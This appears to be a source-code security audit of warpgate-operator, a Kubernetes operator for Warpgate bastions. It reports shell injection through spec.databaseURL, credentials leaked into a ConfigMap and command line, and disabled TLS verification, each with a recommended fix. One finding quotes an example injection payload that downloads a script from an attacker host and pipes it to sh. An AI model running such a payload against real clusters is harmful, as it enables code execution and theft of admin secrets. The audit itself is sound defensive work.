summary: Reviewed the Go sources of warpgate-operator in scope (internal/, cmd/, api/), focusing on the Warpgate API client (internal/warpgate), the reconcilers (internal/controller), the admission webhooks and CRD types (api/v1alpha1), and the manager entrypoint (cmd/main.go). The operator is a Kubernetes controller that provisions Warpgate bastion instances and syncs users/targets/credentials via the Warpgate admin API. Overall risk is moderate: the manager entrypoint and RBAC are conventional and secure, but the WarpgateInstance reconciler builds an init-container shell script and a config file from unsanitized spec fields, stores a database connection string (which typically embeds credentials) in a ConfigMap and on a container command line, and hardwires TLS verification off for the connection it uses to send admin credentials. Coverage was source-only (no build/run); test files were skimmed but not audited for product behavior.

findings.title: OS command injection via spec.databaseURL in WarpgateInstance init-container script
findings.description: buildDeployment assembles a /bin/sh init script by string concatenation and interpolates the user-controlled WarpgateInstance field spec.databaseURL directly inside a double-quoted shell word (`--database-url "<value>"`). The value is never shell-escaped, and the WarpgateInstance validating webhook (api/v1alpha1/warpgateinstance_webhook.go:200-268) performs no validation on databaseURL. Anyone able to create or update a WarpgateInstance CR can set databaseURL to e.g. `x"; wget http://attacker/x -O- | sh; "` and execute arbitrary commands in the init container, which runs the Warpgate image and has the ADMIN_PASSWORD secret injected as an environment variable. Because the CR creator can normally also set spec.image, this is same-principal in a permissive cluster; however, in clusters where admission policy restricts the image/registry but not free-form spec fields, this becomes a real code-execution bypass, and it lets the injected command read the mounted ADMIN_PASSWORD regardless.
findings.evidence: Line 549-565 build setupCmd; line 556-558: `if inst.Spec.DatabaseURL != "" { setupCmd += fmt.Sprintf(" --database-url \"%s\"", inst.Spec.DatabaseURL) }`. setupCmd is joined into initScript (line 611) and run via Command: []string{"/bin/sh", "-c", initScript} (line 776). No escaping and no webhook validation of databaseURL.
findings.recommendation: Do not build the setup command via shell string interpolation. Pass databaseURL to the container as an environment variable sourced from a Secret and reference it as a quoted `"$DATABASE_URL"` inside the script, or invoke warpgate via an exec-style argv array rather than `sh -c`. At minimum, validate databaseURL against a strict URL scheme/charset in the webhook and reject shell metacharacters.

findings.title: Database connection string stored in cleartext ConfigMap and container command line
findings.description: spec.databaseURL is written verbatim into the generated warpgate.yaml stored in a ConfigMap (`<name>-config`) and is additionally appended to the init container command line. Database URLs for external MySQL/PostgreSQL normally embed credentials (e.g. `postgres://user:password@host/db`). ConfigMaps are not treated as secrets: any principal with `get/list configmaps` in the namespace (a much broader set than secret readers) can read the password, and the value also appears in the Deployment/Pod spec and process arguments (pod readers, node processes). This exposes backing-store credentials to lower-privileged principals.
findings.evidence: Line 344-345: `fmt.Fprintf(&b, "database_url: \"%s\"\n", inst.Spec.DatabaseURL)` inside buildWarpgateConfig, written to ConfigMap Data["warpgate.yaml"] (line 401-403). Same value is placed on the init container command line at line 557 (`--database-url "<value>"`), rendered into Command args at line 776.
findings.recommendation: Accept the database URL via a Secret reference (like AdminPasswordSecretRef) rather than a plaintext spec field, and mount it into the pod as an env var from that Secret instead of writing it to a ConfigMap or command line. If it must remain a spec field, at least render it into a Secret-backed config file, not a ConfigMap, and avoid passing it as a command-line argument.

findings.title: TLS certificate verification hardcoded off for operator-created WarpgateConnection
findings.description: When a WarpgateInstance auto-creates its WarpgateConnection, the operator sets InsecureSkipVerify: true unconditionally and points Host at the instance's HTTPS Service. The connection reconciler then builds an http.Client with certificate verification disabled (internal/warpgate/client.go:55-59) and sends the admin username/password (session login) or admin token to that endpoint (internal/warpgate/client.go:96-126, helpers.go:53-86). An attacker positioned on the cluster network path to the Service (a malicious pod capable of ARP/DNS spoofing, a compromised CNI/node, or a pod that can attract the traffic) can present any certificate, MITM the connection, and capture the Warpgate admin credentials, granting full control of the bastion and thus of SSH/DB/RDP access to all downstream targets.
findings.evidence: Line 1112: `InsecureSkipVerify: true, // self-signed cert within cluster` in ensureWarpgateConnection, with Host = `https://<name>-http.<ns>.svc:<port>` (line 1096-1097). Consumed in client.go:55-59 (`transport.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}`) and credentials are sent in login()/doRequest (client.go:96-162).
findings.recommendation: Verify the instance's certificate instead of skipping verification: when cert-manager is enabled, mount/reference the issuing CA and set a RootCAs pool (and a ServerName) on the client transport; when a self-signed cert is generated, expose its CA so the operator can pin it. Avoid defaulting InsecureSkipVerify to true for in-cluster admin traffic.
